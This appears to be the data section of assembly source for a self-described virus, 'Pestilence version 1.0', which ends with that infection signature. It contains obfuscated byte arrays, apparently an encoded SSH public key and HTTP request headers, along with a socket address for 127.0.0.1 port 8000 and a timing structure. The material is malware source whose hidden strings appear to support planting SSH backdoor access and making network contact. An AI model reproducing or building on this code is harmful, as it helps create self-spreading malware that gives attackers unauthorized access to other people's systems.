sshPub db 0x0B, 0x01, 0x5D, 0x4F, 0x19, 0x5A, 0x02, 0x5B, 0x17, 0x59, 0x6B, 0x03, 0x39, 0x33, 0x74, 0x23, 0x3F, 0x0D, 0x7E, 0x14, 0x43, 0x2B, 0x63, 0x4F, 0x22, 0x36, 0x7C, 0x53, 0x32, 0x6A, 0x75, 0x5B, 0x63, 0x29, 0x13, 0x62, 0x31, 0x39, 0x56, 0x11, 0x38, 0x5C, 0x59, 0x14, 0x43, 0x5B, 0x06, 0x50, 0x4E, 0x30, 0x0C, 0x36, 0x0C, 0x5D, 0x55, 0x06, 0x5A, 0x02, 0x0B, 0x1B, 0x08, 0x11, 0x65, 0x0B, 0x16, 0x50, 0x74, 0x16, 0x60, 0x18, 0x27, 0x4A, 0x3D, 0x19, 0x5A, 0x16, 0x2E, 0x7D, 0x5E, 0x5E, 0x02, 0x0F, 0x3D, 0x57, 0x0C, 0x1B, 0x50, 0x22, 0x18, 0x5B, 0x52, 0x07, 0x43, 0x06, 0x52
sshPubLen equ $ - sshPub
sockaddr:
dw 2 
dw 0x401F 
dd 0x100007F 
dq 0 

sockaddrLen equ $ - sockaddr
headerStart db 0x28, 0x3D, 0x66, 0x36, 0x5C, 0x11, 0x55, 0x16, 0x56, 0x1A, 0x33, 0x40, 0x0C, 0x52, 0x7D, 0x36, 0x28, 0x6E, 0x1F, 0x5F, 0x0C, 0x59, 0x0E, 0x51, 0x24, 0x1C, 0x7D, 0x0D, 0x0F, 0x4A, 0x0A, 0x4E, 0x13, 0x5A, 0x65, 0x0D, 0x48, 0x5C, 0x05, 0x4C, 0x4D, 0x04, 0x08, 0x5E, 0x12, 0x58, 0x0E, 0x51, 0x24, 0x1C, 0x76, 0x0D, 0x12, 0x4A, 0x55, 0x00, 0x56, 0x45, 0x06, 0x5A, 0x08, 0x17, 0x0F, 0x42, 0x08, 0x5B, 0x48, 0x1A, 0x0D, 0x18, 0x3E, 0x42, 0x11, 0x1C, 0x69, 0x10, 0x20, 0x50, 0x73, 0x01, 0x4C, 0x1C, 0x37, 0x4D, 0x0C, 0x5F, 0x79, 0x07, 0x12, 0x59, 0x44, 0x06, 0x18, 0x48, 0x52
headerStartLen equ $ - headerStart
headerEnd db 13, 10, 13, 10, 0 
headerEndLen equ $ - headerEnd
headerGet db 0x3F, 0x37, 0x61, 0x42, 0x53, 0x57, 0x5E, 0x08, 0x47, 0x0B, 0x26, 0x4A, 0x17, 0x1C, 0x15, 0x2A, 0x28, 0x6A, 0x60, 0x41, 0x13, 0x46, 0x63, 0x7F, 0x0A, 0x2E, 0x5B, 0x2A, 0x13, 0x4D, 0x44, 0x54, 0x02, 0x59, 0x60, 0x14, 0x56, 0x42, 0x1B, 0x52, 0x52, 0x0F, 0x0A, 0x56, 0x12, 0x58, 0x62, 0x23, 13, 10, 13, 10
headerGetLen equ $ - headerGet
timespec:
dq 0 
dq 10000000 
signature db "Pestilence version 1.0 (c)oded by anvincen-eedy", 0x0 
signature_len equ $ - signature
_end: 